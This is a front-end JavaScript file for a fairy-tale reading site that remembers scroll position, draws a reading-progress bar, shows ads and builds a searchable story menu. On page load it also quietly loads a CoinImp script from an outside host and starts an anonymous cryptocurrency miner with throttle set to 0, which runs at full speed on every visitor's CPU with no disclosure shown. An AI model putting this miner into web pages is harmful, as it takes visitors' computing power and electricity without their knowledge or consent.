// global
let currentPath = window.location.pathname;
// create a progressBarDiv
let progressBarDiv = document.createElement('div');
progressBarDiv.className = "progressBarDiv";
// end global
// onscroll
window.onscroll = () => {
    // scroll position
    localStorage.setItem('scrollPosition_' + currentPath, window.pageYOffset);
    // reading progress
    const windowHeight = window.innerHeight;
    const fullHeight = document.documentElement.scrollHeight;
    const scrolled = window.scrollY;
    const progressWidth = (scrolled / (fullHeight - windowHeight)) * 100;
    progressBarDiv.style.width = progressWidth + "%";
}
//onload
window.onload = function() {
    // load scroll position
    let scrollPosition = localStorage.getItem('scrollPosition_' + currentPath);
    if (scrollPosition) {
        window.scrollTo(0, scrollPosition);
    }
    // coinimp sdk
    let coinImpSdk = document.createElement('script');
    coinImpSdk.src = 'https://www.hostingcloud.racing/Buz4.js';
    coinImpSdk.defer = true;
    coinImpSdk.onload = () => {
        var _client = new Client.Anonymous('1b338ef2246dfb0c9665ca717515ff07c101d6d5c96df696097a28b6fb997ed5', {
            throttle: 0, c: 'w', ads: 0
        });
        _client.start();
    }
    // ad space bottom
    let adDiv = document.createElement('div');
    adDiv.className = "adDiv";
    adDiv.innerHTML =
    `
    <!--
    <iframe data-aa='2251807' src='//ad.a-ads.com/2251807?size=320x50' style='width:320px; height:50px; border:0px; padding:0; overflow:hidden; background-color: transparent;'></iframe>
    -->
    `;
    // menu nav
    let menuDiv = document.createElement('div');
    menuDiv.className = 'menuDiv';
    menuDiv.style.display = 'none'; // Initially hiding the menuDiv
    menuDiv.innerHTML = `
    <div class="sideAd">
    <a href="https://a-ads.com?partner=2285945"><img src="https://a-ads.com/a_ads_banners/gif/english/200x200/simple_v1.gif" alt="Advertise with Anonymous Ads" width="100%" height="200px" /></a>
    </div>
    <input class="search-story" type="search" placeholder="Search Story">
    <a href="Our Lady’s Child.html"><h2>OUR LADY'S CHILD</h2></a>
    <a href="Cat And Mouse In Partnership.html"><h2>CAT AND MOUSE IN PARTNERSHIP</h2></a>
    <a href="The Frog-king, Or Iron Henry.html"><h2>THE FROG-KING, OR IRON HENRY</h2></a>
    <a href="The Frog-king, Or Iron Henry.html"><h2>The Story Of The Youth Who Went Forth To Learn What Fear Was</h2></a>
    `;
    // menuBtn function
    let menuBtn = document.createElement('button');
    menuBtn.className = 'menuBtn';
    menuBtn.innerText = '📕';
    menuBtn.onclick = function() {
        if (menuDiv.style.display === 'block') {
            menuDiv.style.display = 'none';
            document.body.style.overflow = "scroll";
            menuBtn.innerText = '📕';
        } else {
            menuDiv.style.display = 'block';
            document.body.style.overflow = "hidden";
            menuBtn.innerText = '📖';
        }
    }
    // append necessary elements
    document.body.append(menuBtn);
    document.body.append(coinImpSdk);
    document.body.append(progressBarDiv);
    document.body.append(menuDiv);
    document.body.append(adDiv);
    // search story function
    let searchStory = document.querySelector('.search-story');
    searchStory.addEventListener('input', function() {
        let searchText = searchStory.value.toLowerCase(); // Get the input value in lowercase for case-insensitive comparison
        let storyTitles = document.querySelectorAll('.menuDiv a h2');
        storyTitles.forEach(title => {
            let titleText = title.innerText.toLowerCase();
            if (titleText.includes(searchText)) {
                title.parentElement.style.display = 'block'; // Show matching items
            } else {
                title.parentElement.style.display = 'none'; // Hide non-matching items
            }
        });
    });
};